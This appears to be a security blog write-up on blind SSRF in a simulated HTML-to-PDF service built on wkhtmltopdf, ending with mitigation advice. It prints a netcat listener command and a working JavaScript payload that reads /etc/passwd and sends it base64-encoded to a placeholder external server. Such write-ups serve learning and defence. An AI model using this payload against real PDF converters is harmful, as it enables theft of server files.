---
title: "Exploring Blind SSRF Vulnerabilities in HTML to PDF Conversion Applications"
date: 2023-04-23
author: 0xLuc4s
categories: [ssrf-vulnerabilies]
tags: [ssrf]
---

## Overview

This post delves into a case study of a blind Server-Side Request Forgery (SSRF) vulnerability within a fictitious application designed for converting HTML documents to PDFs. The application, which is a simulated target in a controlled environment, highlights the subtlety and potential impact of SSRF vulnerabilities, especially when they do not provide direct feedback or error messages.

## Testing Environment and Setup

The target application listens on port 8080 and accepts HTML files for processing into PDF documents. Initial observations indicated that the server's response was identical regardless of the HTML content provided, suggesting no visible data processing errors or SSRF indications through the front-end.

## Conducting Blind SSRF Tests

To test for blind SSRF, we employed an external server setup to capture any outbound requests from the application. The test involved submitting an HTML file containing a reference to an image hosted on our external server:

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Hello World!</h1>
    <img src="http://<EXTERNAL SERVICE IP>:9090/test-image">
</body>
</html>

## Simplifying SSRF Blind Testing with Netcat

For our testing purposes, we employ a simple Netcat listener running on a virtual machine (VM), set to listen on port 9090. This setup allows us to capture any incoming requests and observe the web application's external interactions, which are pivotal in identifying and exploiting SSRF vulnerabilities.

### Setting Up the Netcat Listener

Here's the command to set up the Netcat listener, crucial for our SSRF testing:

\```bash
sudo nc -nlvp 9090
\```

This command configures Netcat to listen on all interfaces at port 9090, ready to log any incoming requests.

### Observations After Submitting the HTML File

Upon submitting an HTML file containing external resource references, the application attempts to fetch these resources. This behavior confirms the existence of an SSRF vulnerability as it shows the application making unauthorized external network calls based on HTML content.

## JavaScript Exploitation and Data Exfiltration

Further exploration reveals that the application's PDF conversion tool, wkhtmltopdf, supports JavaScript execution within HTML files. We exploit this feature to perform data exfiltration as demonstrated below:

\```html
<html>
<body>
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "file:///etc/passwd", true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // Encode the file contents in base64
            var b64content = btoa(xhr.responseText);
            // Send the encoded data to our external server
            var exfil = new XMLHttpRequest();
            exfil.open("GET", "http://<EXTERNAL SERVICE IP>:9090/exfil?data=" + b64content, true);
            exfil.send();
        }
    };
    xhr.send();
    </script>
</body>
</html>
\```

This script reads the local `/etc/passwd` file and sends its Base64-encoded contents to our Netcat listener, showcasing a direct method of exploiting the SSRF vulnerability to extract sensitive information.

## Mitigation Strategies

To mitigate blind SSRF vulnerabilities effectively, it is crucial to:

- **Validate and sanitize all incoming data**, especially URLs and file paths, to prevent external resource references.
- **Implement strict allowlists** for outbound connections and protocols that the server is permitted to access.
- **Use secure programming practices** to disable unnecessary HTTP features that could be exploited via SSRF.
- **Regularly update and patch** third-party libraries and tools used for processing user-supplied content.

## Conclusion

Blind SSRF poses significant security risks, especially in applications that process external inputs to interact with internal or external resources. Understanding and implementing robust mitigation strategies are vital for securing web applications against these potential attacks and data breaches.